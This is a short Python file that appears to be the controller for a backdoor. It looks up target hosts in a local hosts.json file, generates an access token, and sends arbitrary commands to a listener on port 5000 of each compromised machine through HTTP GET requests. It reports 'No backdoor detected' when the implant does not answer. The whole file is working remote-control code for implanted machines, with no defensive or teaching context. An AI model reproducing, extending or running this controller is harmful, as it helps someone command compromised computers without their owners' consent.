import requests, json
from generator import tokenGenerator
def execute_request(host,command):
    address = getHost(host)
    if address != None:
        token = tokenGenerator()
        url = "http://{}:5000/{}/{}".format(address,token,command)
        try:
            response = requests.get(url)
            return response.text
        except:
            return "No backdoor detected"
    else:
        return "Host not found"

def getHost(host):
    if len(host.split(".")) < 4:
        with open("hosts.json") as f:
            data = json.load(f)
        if host in data:
            return data[host]
        else:
            return None
    else :
        return host